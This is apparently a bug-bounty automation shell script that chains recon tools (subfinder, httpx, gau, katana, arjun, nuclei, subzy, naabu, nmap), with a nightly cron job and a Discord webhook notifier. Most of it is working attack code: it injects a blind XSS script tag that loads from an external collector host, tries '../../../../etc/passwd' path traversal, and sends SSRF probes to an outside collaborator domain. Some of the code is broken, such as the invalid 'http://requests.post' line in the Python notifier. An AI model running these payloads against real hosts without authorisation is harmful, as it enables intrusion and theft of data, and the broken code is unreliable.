#!/bin/bash

# Example domain input
DOMAIN=$1

if [ -z "$DOMAIN" ]; then
    echo "Usage: $0 http://example.com"
    exit 1
fi

mkdir -p recon/$DOMAIN/{subs,urls,live,js,xss,lfi,ssrf,takeover,scans}

# --------- Subdomains
subfinder -d $DOMAIN -all -recursive -silent | anew recon/$DOMAIN/subs/subs.txt
puredns resolve recon/$DOMAIN/subs/subs.txt -r resolvers.txt | anew recon/$DOMAIN/subs/resolved.txt

# --------- Live Hosts
cat recon/$DOMAIN/subs/resolved.txt | httpx -ports 80,443,8080,8443 -json -title -tech-detect | tee recon/$DOMAIN/live/live.json

jq -r '.url' recon/$DOMAIN/live/live.json | anew recon/$DOMAIN/live/alive.txt

# --------- Passive URLs
cat recon/$DOMAIN/live/alive.txt | waybackurls | anew recon/$DOMAIN/urls/wayback.txt
cat recon/$DOMAIN/live/alive.txt | gau --threads 100 | anew recon/$DOMAIN/urls/gau.txt
cat recon/$DOMAIN/live/alive.txt | katana -d 5 -ps -jc -fx | anew recon/$DOMAIN/urls/katana.txt

cat recon/$DOMAIN/urls/*.txt | sort -u | anew recon/$DOMAIN/urls/all.txt

# --------- Sensitive Files
grep -iE '\.(xls|xml|xlsx|json|pdf|sql|doc|docx|txt|zip|gz|bak|rar|7z|log|cache|secret|db|yml|config|csv|env)$' recon/$DOMAIN/urls/all.txt | anew recon/$DOMAIN/urls/sensitive.txt

# --------- Parameter URLs
cat recon/$DOMAIN/urls/all.txt | grep "=" | uro | anew recon/$DOMAIN/urls/param_urls.txt

# --------- Arjun Hidden Params
arjun -i recon/$DOMAIN/urls/param_urls.txt -oT recon/$DOMAIN/urls/arjun_params.txt -t 50 --passive

# --------- XSS (Blind + Reflected)
cat recon/$DOMAIN/urls/param_urls.txt | qsreplace '<script src=https://xss.report/c/coffinxp></script>' | httpx -mc 200 -mr '<script src=https://xss.report/c/coffinxp></script>' | anew recon/$DOMAIN/xss/xss_found.txt

# --------- LFI Testing
cat recon/$DOMAIN/urls/param_urls.txt | gf lfi | qsreplace '../../../../etc/passwd' | httpx -mc 200 -mr 'root:x' | anew recon/$DOMAIN/lfi/lfi_found.txt

# --------- SSRF Testing
cat recon/$DOMAIN/urls/param_urls.txt | qsreplace 'http://burpcollab.com' | httpx -mc 200 -mr 'burpcollab' | anew recon/$DOMAIN/ssrf/ssrf_found.txt

# --------- JS Files & Secrets
cat recon/$DOMAIN/urls/all.txt | grep '\.js$' | anew recon/$DOMAIN/js/jsfiles.txt
cat recon/$DOMAIN/js/jsfiles.txt | nuclei -t exposures/ -c 50 | anew recon/$DOMAIN/js/js_leaks.txt

# --------- Subdomain takeover
subzy run --targets recon/$DOMAIN/subs/resolved.txt --concurrency 100 --hide_fails --verify_ssl | anew recon/$DOMAIN/takeover/takeover.txt

# --------- Ports & Services
naabu -list recon/$DOMAIN/subs/resolved.txt -p - -c 100 -o recon/$DOMAIN/scans/ports.txt
nmap -iL recon/$DOMAIN/scans/ports.txt -p- -A -T4 -oA recon/$DOMAIN/scans/nmap

echo "[+] Recon Complete for $DOMAIN"

⸻

📌 BONUS: AUTOMATED DAILY CRONJOB SETUP

echo "0 3 * * * /root/tools/elite_recon.sh http://example.com >> /root/reports/recon.log 2>&1" | crontab -

Run every night → Fully automated → Recon while sleeping → Daily report.

⸻

📬 BONUS: DISCORD OR SLACK NOTIFIER (Python script)

import requests
import sys

def notify(message, webhook_url):
    data = {"content": message}
    http://requests.post(webhook_url, json=data)

if __name__ == "__main__":
    webhook = "https://discord.com/api/webhooks/XXXX"
    domain = sys.argv[1]
    notify(f"Recon Completed for {domain} 🚀\nCheck report folder.", webhook)
